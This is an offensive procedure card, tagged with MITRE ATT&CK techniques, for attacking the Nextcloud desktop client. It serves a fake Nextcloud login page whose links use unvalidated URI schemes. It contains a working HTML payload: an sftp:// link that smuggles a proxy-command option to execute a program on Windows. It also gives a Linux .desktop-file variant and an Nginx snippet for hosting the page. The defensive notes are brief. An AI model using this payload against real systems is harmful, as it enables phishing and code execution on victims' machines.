---
id: proc-2
tags:
  - malicious-html
  - uri-injection
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:23:54.901Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Serve-Malicious-Login-Page-with-URI-Links

## Summary

This procedure involves hosting and serving an HTML login page embedded with hyperlinks using arbitrary URI schemes (e.g., sftp://), which the Nextcloud client's WebView will load without validation.

## Description

The server responds to the client's WebView request with crafted HTML containing <a> tags with malicious URIs. These links appear as normal login elements but invoke OS handlers when clicked, exploiting the lack of scheme allowlisting in QDesktopServices::openUrl().

## Requirements

1. Web server (e.g., Nginx) hosting the malicious HTML
2. HTTPS certificate for the fake Nextcloud domain
3. Knowledge of target OS for scheme selection (sftp for both)

## Defense

Defensive measures and detection strategies:

- Implement Content Security Policy (CSP) in client WebViews to restrict navigation
- Scan server responses for suspicious URI schemes
- User training to avoid clicking untrusted links in apps

## Objectives

1. Deliver payload via legitimate-looking login page
2. Embed URIs that bypass client validation
3. Induce user interaction for exploitation

## Instructions

### Step 1: Create Malicious HTML

**Context**: Craft the login page with embedded links.

Create index.html:

```html
<!DOCTYPE html>
<html>
<body>
<h1>Nextcloud Login</h1>
<a href="sftp://youtube:com;watch=sn96aVA2;x-proxymethod=5;x-proxytelnetcommand=calc.exe@foo.bar/">Click to Login</a>
</body>
</html>
```

> For Linux variant, use sftp://nextclouduser@server/example.desktop

### Step 2: Host and Serve Page

**Context**: Configure server to serve the HTML on login endpoint.

```bash
# Example Nginx config snippet
location /login {
    root /path/to/malicious;
    try_files $uri =404;
}
```

**Expected Output**: Client WebView loads the page successfully.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- uri-scheme
- malicious-page
